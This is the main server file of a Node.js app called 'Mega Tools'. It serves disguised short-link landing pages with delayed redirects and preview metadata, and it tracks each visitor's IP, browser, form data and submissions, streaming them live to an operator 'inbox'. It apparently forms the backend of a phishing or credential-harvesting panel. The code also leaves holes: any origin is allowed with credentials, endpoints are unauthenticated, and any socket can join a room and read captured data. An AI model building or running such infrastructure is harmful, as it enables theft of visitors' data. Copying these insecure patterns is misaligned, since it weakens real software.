// ============================================================
// MEGA TOOLS — MAIN SERVER ENTRY POINT (ENTERPRISE v10.0)
// v10.0: session_init uses actual session status (no hardcoded Online)
// ============================================================

require('dotenv').config({ path: require('path').join(__dirname, '..', '.env') });

const express = require('express');
const http = require('http');
const path = require('path');
const socketIo = require('socket.io');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const cookieParser = require('cookie-parser');
const jwt = require('jsonwebtoken');
const compression = require('compression');

const CONFIG = require('./config');
const db = require('./database');

const sessionManager = require('./services/sessionManager');
const Session = require('./models/Session');
const User = require('./models/User');
const { toStringId } = require('./utils/helpers');

const routes = require('./routes');

let landingHtmlCache = null;
let smartRedirectCache = null;
let megaRuntimeCache = null;

function getLandingHtml() {
  if (!landingHtmlCache) landingHtmlCache = require('./utils/landingHtml');
  return landingHtmlCache;
}

function getSmartRedirect() {
  if (!smartRedirectCache) smartRedirectCache = require('./utils/smartRedirect');
  return smartRedirectCache;
}

function getMegaRuntime() {
  if (!megaRuntimeCache) megaRuntimeCache = require('./utils/mega-runtime');
  return megaRuntimeCache;
}

function normalizeIP(ip) {
  if (!ip) return 'unknown';
  if (ip.startsWith('::ffff:')) return ip.replace('::ffff:', '');
  if (ip === '::1') return '127.0.0.1';
  return ip;
}

process.on('uncaughtException', (err) => {
  console.error('[Server] UNCAUGHT EXCEPTION:', err.message);
});

process.on('unhandledRejection', (reason) => {
  console.error('[Server] UNHANDLED REJECTION:', reason?.message || reason);
});

let server;
let cleanupTimer;

async function gracefulShutdown(signal) {
  console.log(`\n[Server] ${signal}. Shutting down...`);
  if (cleanupTimer) clearInterval(cleanupTimer);
  sessionManager.stop();
  await db.close();
  if (server) {
    server.close(() => { console.log('[Server] Shutdown complete.'); process.exit(0); });
  } else {
    process.exit(0);
  }
  setTimeout(() => { process.exit(1); }, 10000);
}

let socketEventSeq = 0;
function nextSocketSeq() { socketEventSeq++; return socketEventSeq; }

const corsOrigin = function (origin, callback) {
  callback(null, true);
};

const app = express();
app.set('trust proxy', false);
app.use(compression());

app.use((req, res, next) => {
  if (req.method === 'GET') {
    if (req.path.startsWith('/api/')) {
      res.setHeader('Cache-Control', 'no-store');
    } else if (req.path.startsWith('/mega-') || req.path.startsWith('/s/')) {
      res.setHeader('Cache-Control', 'public, max-age=60');
    }
  }
  next();
});

if (CONFIG.IS_PRODUCTION) {
  app.use(helmet({
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'", "'unsafe-inline'", "https://cdnjs.cloudflare.com", "https://cdn.jsdelivr.net"],
        styleSrc: ["'self'", "'unsafe-inline'"],
        imgSrc: ["'self'", "data:", "https:", "https://res.cloudinary.com"],
        connectSrc: ["'self'", "ws:", "wss:", "https:"],
        frameSrc: ["'self'"],
        fontSrc: ["'self'"],
        objectSrc: ["'none'"],
        mediaSrc: ["'self'"],
      },
    },
  }));
} else {
  app.use(helmet({ contentSecurityPolicy: false }));
}

app.use(cors({ origin: corsOrigin, credentials: true, methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS'], allowedHeaders: ['Content-Type', 'Authorization', 'Cache-Control', 'Pragma', 'Expires'] }));
app.use(express.json({ limit: '5mb' }));
app.use(cookieParser());

function shouldSkipRateLimit(req) {
  if (req.path === '/api/health' || req.path === '/api/inbox-health') return true;
  if (req.headers.upgrade) return true;
  if (req.path.startsWith('/uploads/') || req.path.startsWith('/generated-pages/')) return true;
  if (req.path === '/mega-redirect.js' || req.path === '/mega-runtime.js') return true;
  if (req.path.startsWith('/s/')) return true;
  return false;
}

const globalLimiter = rateLimit({
  windowMs: 60 * 1000,
  max: 500,
  message: { message: 'Too many requests, please try again later.' },
  standardHeaders: false, legacyHeaders: false,
  skip: shouldSkipRateLimit,
});

const authLimiter = rateLimit({
  windowMs: 60 * 1000,
  max: 50,
  message: { message: 'Too many authentication attempts. Please wait a moment.' },
  standardHeaders: false, legacyHeaders: false,
  skip: shouldSkipRateLimit,
});

app.use('/api/auth', authLimiter);
app.use('/api/', globalLimiter);

app.post('/api/rate-limit/reset', (req, res) => {
  try {
    globalLimiter.resetKey(req.ip);
    authLimiter.resetKey(req.ip);
    res.json({ success: true, message: 'Rate limit reset for your IP. You can try logging in again.' });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

app.use('/api/auth', routes.authRoutes);
app.use('/api/links', routes.linksRoutes);
app.use('/api/sessions', routes.sessionsRoutes);
app.use('/api/data', routes.dataRoutes);
app.use('/api/webhook', routes.webhookRoutes);
app.use('/api/redirect', routes.redirectRoutes);
app.use('/api/export', routes.exportRoutes);
app.use('/api/upload', routes.uploadRoutes);
app.use('/api/trash', routes.trashRoutes);

app.use('/uploads', express.static(path.join(__dirname, '..', '..', 'uploads')));
app.use('/generated-pages', express.static(path.join(__dirname, '..', 'data', 'generatedPages')));

server = http.createServer(app);
const io = socketIo(server, { cors: { origin: true, credentials: true }, pingTimeout: 60000, pingInterval: 15000 });

io.use(async (socket, next) => {
  try {
    const cookieStr = socket.handshake.headers.cookie || '';
    const tokenMatch = cookieStr.match(/auth_token=([^;]+)/);
    const token = tokenMatch ? tokenMatch[1] : (socket.handshake.auth?.token || '').replace('Bearer ', '');
    if (!token) { socket.user = null; socket.userId = null; socket.userRole = 'guest'; return next(); }
    const decoded = jwt.verify(token, CONFIG.JWT_SECRET);
    const user = await db.users.findOne({ _id: decoded.id });
    if (!user) return next(new Error('User not found'));
    if (user.status === 'blocked') return next(new Error('Account blocked'));
    socket.user = user; socket.userId = toStringId(user._id); socket.userRole = user.role;
    next();
  } catch (err) { socket.user = null; socket.userId = null; socket.userRole = 'guest'; next(); }
});

const sessionSockets = {};
const SOCKET_CLEANUP_INTERVAL = 30000;
const DISCONNECT_GRACE_PERIOD = 2000;

function cleanupStaleSockets() {
  const connected = new Set();
  io.sockets.sockets.forEach(s => connected.add(s.id));
  for (const [key, socketId] of Object.entries(sessionSockets)) {
    if (!connected.has(socketId)) delete sessionSockets[key];
  }
}

function startSocketCleanup() {
  if (cleanupTimer) clearInterval(cleanupTimer);
  cleanupTimer = setInterval(cleanupStaleSockets, SOCKET_CLEANUP_INTERVAL);
}

io.on('connection', (socket) => {
  const rawIp = socket.handshake.address || 'unknown';
  const clientIp = normalizeIP(rawIp);
  console.log('[Socket] Connected:', socket.id, 'IP:', clientIp);

  if (socket.userId) {
    socket.join('user_' + socket.userId);
    User.updatePresence(socket.userId, true).catch(() => {});
  }

  socket.on('session_init', async (data) => {
    const { trackingCode, visitorId } = data;
    if (!trackingCode) return;
    const sessionKey = visitorId || (trackingCode + '_' + clientIp);
    sessionSockets[sessionKey] = socket.id;
    socket.sessionKey = sessionKey;
    socket.trackingCode = trackingCode;
    socket.visitorId = visitorId;
    try {
      const baseCode = trackingCode.includes('_') ? trackingCode.split('_').pop() : trackingCode;
      const { session, isNew } = await Session.upsert({ visitorId: visitorId || null, trackingCode, baseCode, entryUrl: baseCode, currentUrl: baseCode, ip: clientIp, browser: socket.handshake.headers['user-agent'] || 'Unknown', deviceType: 'Desktop', collectedTypes: ['session_init'] });
      sessionManager.updateEvidence(session._id, 'socket_connect', { socketId: socket.id });
      // v10.0: Use ACTUAL session status — NOT hardcoded Online
      const sessionData = { type: isNew ? 'new' : 'updated', seq: nextSocketSeq(), timestamp: new Date().toISOString(), session: { _id: session._id, visitorId: session.visitorId, trackingCode: session.trackingCode, isLive: session.isLive, status: session.status || 'Online', lastActivity: session.lastActivity || new Date().toISOString(), clicks: session.clicks, submissions: session.submissions, deviceType: session.deviceType, baseCode: session.baseCode, entryUrl: session.entryUrl, currentUrl: session.currentUrl, ip: session.ip, browser: session.browser, formData: session.formData, redirectHistory: session.redirectHistory || [], lockedKeys: session.lockedKeys || [] } };
      const ownerCode = trackingCode.includes('_') ? trackingCode.split('_')[0] : trackingCode;
      io.to('room_' + ownerCode).emit('sessionDelta', sessionData);
    } catch (err) { console.error('[Socket] Init error:', err.message); }
  });

  socket.on('session_heartbeat', async (data) => {
    const { visitorId, trackingCode } = data || {};
    if (!visitorId && !trackingCode) return;
    try {
      const result = await Session.upsert({ visitorId: visitorId || null, trackingCode: trackingCode || '', baseCode: '', ip: clientIp, collectedTypes: ['heartbeat'] });
      if (result?.session) {
        sessionManager.updateEvidence(result.session._id, 'heartbeat');
      }
    } catch (err) { console.error('[Socket] Heartbeat error:', err.message); }
  });

  socket.on('joinRoom', (trackingCode) => {
    if (trackingCode) {
      socket.join('room_' + trackingCode);
      console.log('[Socket] Joined room:', 'room_' + trackingCode);
    }
  });

  socket.on('joinAllRooms', async () => {
    try {
      if (socket.userRole === 'owner' || socket.userRole === 'admin') {
        const allUsers = await db.users.read();
        const allTrackingCodes = allUsers.map(u => u.trackingCode).filter(Boolean);
        const sessions = await db.sessions.find({ hiddenForAll: false }, { limit: 10000, sort: { timestamp: -1 } });
        const sessionOwnerCodes = new Set();
        sessions.forEach(s => {
          const tc = s.trackingCode || '';
          if (tc.includes('_')) sessionOwnerCodes.add(tc.split('_')[0]);
          else if (tc) sessionOwnerCodes.add(tc);
        });
        const allRooms = new Set([...allTrackingCodes, ...sessionOwnerCodes]);
        allRooms.forEach(code => { socket.join('room_' + code); });
        console.log('[Socket] Owner joined all rooms:', allRooms.size);
      }
    } catch (err) { console.error('[Socket] joinAllRooms error:', err.message); }
  });

  socket.on('disconnect', async () => {
    console.log('[Socket] Disconnected:', socket.id);
    if (socket.userId) User.updatePresence(socket.userId, false).catch(() => {});

    if (socket.visitorId || socket.trackingCode) {
      try {
        let targetSession = null;
        if (socket.visitorId) {
          targetSession = await db.sessions.findOne({ visitorId: socket.visitorId });
        }
        if (!targetSession && socket.trackingCode) {
          targetSession = await db.sessions.findOne({ trackingCode: socket.trackingCode, isLive: true });
        }
        if (targetSession) {
          sessionManager.updateEvidence(targetSession._id, 'socket_disconnect');
          // v10.0: Immediately set Offline on disconnect
          await Session.updatePresence(targetSession._id, { status: 'Offline', isLive: false });
          const ownerCode = (targetSession.trackingCode || '').includes('_') ? targetSession.trackingCode.split('_')[0] : targetSession.trackingCode;
          if (ownerCode) {
            io.to('room_' + ownerCode).emit('sessionStatusDelta', { timestamp: new Date().toISOString(), sessions: [{ _id: targetSession._id, isLive: false, status: 'Offline', lastActivity: targetSession.lastActivity, visitorId: targetSession.visitorId, trackingCode: targetSession.trackingCode }] });
          }
        }
      } catch (err) {
        console.error('[Socket] Evidence update error:', err.message);
      }
    }

    if (socket.sessionKey && sessionSockets[socket.sessionKey] === socket.id) {
      const keyToDelete = socket.sessionKey;
      setTimeout(() => { if (sessionSockets[keyToDelete] === socket.id) delete sessionSockets[keyToDelete]; }, DISCONNECT_GRACE_PERIOD);
    }
  });
});

startSocketCleanup();
app.set('io', io);
routes.dataRoutes.setIO(io);
sessionManager.init(io, sessionSockets);

app.get('/api/health', async (req, res) => {
  const dbHealth = await db.health();
  res.json({ status: 'ok', timestamp: new Date().toISOString(), uptime: process.uptime(), database: dbHealth });
});

app.get('/api/inbox-health', async (req, res) => {
  try {
    const dbHealth = await db.health();
    const totalSessions = await db.sessions.count({ hiddenForAll: false });
    const liveSessions = await db.sessions.count({ hiddenForAll: false, isLive: true });
    const onlineSessions = await db.sessions.count({ hiddenForAll: false, status: 'Online' });
    const sessionsSample = await db.sessions.find({ hiddenForAll: false }, { limit: 100, sort: { timestamp: -1 } });
    const totalSubmissions = sessionsSample.reduce((sum, s) => sum + (s.submissions?.length || 0), 0);
    const uniqueVisitors = new Set(sessionsSample.map(s => s.visitorId).filter(Boolean)).size;
    const socketCount = io.sockets.sockets.size;
    const memUsage = process.memoryUsage();
    res.json({ success: true, timestamp: new Date().toISOString(), uptime: Math.round(process.uptime()), database: dbHealth, sessions: { total: totalSessions, active: totalSessions, live: liveSessions, online: onlineSessions, expired: 0, uniqueVisitors, totalSubmissions }, socket: { connections: socketCount }, memory: { rss: Math.round(memUsage.rss / 1024 / 1024) + 'MB', heapUsed: Math.round(memUsage.heapUsed / 1024 / 1024) + 'MB' }, config: { sessionTimeout: Math.round(CONFIG.SESSION_TIMEOUT_MS / 60000) + 'min', heartbeatInterval: Math.round(CONFIG.HEARTBEAT_INTERVAL_MS / 1000) + 's', detectionWindow: Math.round(CONFIG.STATUS_DETECTION_WINDOW_MS / 1000) + 's' } });
  } catch (err) { res.status(500).json({ success: false, message: err.message }); }
});

app.post('/api/trigger-inbox-clean', async (req, res) => {
  try {
    const result = await sessionManager.globalInboxCleanup();
    res.json({ success: true, message: 'Inbox cleanup completed', result });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

app.get('/mega-redirect.js', (req, res) => {
  const { generateSmartRedirectScript } = getSmartRedirect();
  res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
  res.setHeader('Cache-Control', 'public, max-age=3600');
  res.send(generateSmartRedirectScript(req));
});

app.get('/mega-runtime.js', (req, res) => {
  const { generateUnifiedRuntime } = getMegaRuntime();
  res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
  res.setHeader('Cache-Control', 'public, max-age=3600');
  res.send(generateUnifiedRuntime(getServerBaseUrl(req)));
});

function getServerBaseUrl(req) {
  return CONFIG.IS_PRODUCTION ? (req.protocol + '://' + req.get('host')) : `http://localhost:${CONFIG.PORT}`;
}

function getOgMeta(req) {
  const baseUrl = getServerBaseUrl(req);
  const imageUrl = 'https://res.cloudinary.com/shakilv875/image/upload/v1784334960/hjhjmh_bshbbh.png';
  return `<meta property="og:title" content="Mega Tools"><meta property="og:description" content="Enterprise Visitor Management"><meta property="og:type" content="website"><meta property="og:url" content="${baseUrl}"><meta property="og:image" content="${imageUrl}"><meta property="og:image:width" content="1200"><meta property="og:image:height" content="630"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="Mega Tools"><meta name="twitter:description" content="Enterprise Visitor Management"><meta name="twitter:image" content="${imageUrl}">`;
}

function parseSlug(slug) {
  if (slug.includes('_')) {
    const parts = slug.split('_');
    if (parts.length === 2 && /^[a-z0-9]{6,9}$/i.test(parts[1])) {
      return { trackingCode: parts[0], baseCode: parts[1] };
    }
  }
  return { trackingCode: null, baseCode: slug };
}

async function getOwnerTrackingCode() {
  try {
    const owner = await db.users.findOne({ role: 'owner' });
    return owner?.trackingCode || 'unknown';
  } catch { return 'unknown'; }
}

app.get('/s/:slug', async (req, res) => {
  try {
    const { slug } = req.params;
    const queryTC = req.query.tc || '';
    const parsed = parseSlug(slug);
    const searchCode = parsed.baseCode;
    const slugTC = parsed.trackingCode;
    const link = await db.links.findOne({ $or: [{ baseCode: searchCode }, { slug: searchCode }, { redirectCode: searchCode }] });
    if (!link) return res.status(404).send('Link not found');
    const baseUrl = (link.baseUrl || '').replace(/\/$/, '');
    let tc = queryTC || slugTC || link.ownerTrackingCode;
    if (!tc || tc === 'unknown') {
      tc = await getOwnerTrackingCode();
    }
    const code = link.baseCode || link.slug || searchCode;
    const { generateLandingPage } = getLandingHtml();
    let html = generateLandingPage({ baseUrl: baseUrl || 'about:blank', trackingCode: tc + '_' + code, slug: code, apiBase: getServerBaseUrl(req), delay: 30000, heartbeatInterval: CONFIG.HEARTBEAT_INTERVAL_MS, chainData: null });
    html = html.replace('</head>', getOgMeta(req) + '</head>');
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.send(html);
  } catch (err) { console.error('[Server] /s/:slug error:', err.message); res.status(500).send('Server error'); }
});

app.get('/s/:slug/:trackingCode', async (req, res) => {
  try {
    const { slug, trackingCode } = req.params;
    const link = await db.links.findOne({ $or: [{ baseCode: slug }, { slug }] });
    if (!link) return res.status(404).send('Link not found');
    const baseUrl = (link.baseUrl || '').replace(/\/$/, '');
    const code = link.baseCode || link.slug || slug;
    const { generateLandingPage } = getLandingHtml();
    let html = generateLandingPage({ baseUrl: baseUrl || 'about:blank', trackingCode: trackingCode + '_' + code, slug: code, apiBase: getServerBaseUrl(req), delay: 30000, heartbeatInterval: CONFIG.HEARTBEAT_INTERVAL_MS, chainData: null });
    html = html.replace('</head>', getOgMeta(req) + '</head>');
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.send(html);
  } catch (err) { console.error('[Server] /s/:slug/:tc error:', err.message); res.status(500).send('Server error'); }
});

// Production static serving
if (CONFIG.IS_PRODUCTION) {
  const distPath = path.join(__dirname, '..', '..', 'client', 'dist');
  app.use(express.static(distPath));
  app.get('*', (req, res) => {
    if (!req.path.startsWith('/api/') && !req.path.startsWith('/s/') && !req.path.startsWith('/generated-pages/') && req.path !== '/mega-redirect.js' && req.path !== '/mega-runtime.js') {
      res.sendFile(path.join(distPath, 'index.html'));
    }
  });
}

app.use((req, res) => { res.status(404).json({ message: 'Route not found' }); });
app.use((err, req, res, next) => { res.status(err.status || 500).json({ message: CONFIG.IS_PRODUCTION ? 'Internal server error' : err.message }); });

const PORT = CONFIG.PORT;

async function start() {
  console.log('[Server] MEGA TOOLS SERVER STARTING (ENTERPRISE v10.0)');
  console.log(`[Server] Port: ${PORT} | Env: ${CONFIG.NODE_ENV}`);
  try { await db.connect(); } catch (err) {}
  server.listen(PORT, () => console.log(`[Server] Server running on port ${PORT}`));
}

start();

process.on('SIGTERM', () => gracefulShutdown('SIGTERM'));
process.on('SIGINT', () => gracefulShutdown('SIGINT'));

module.exports = app;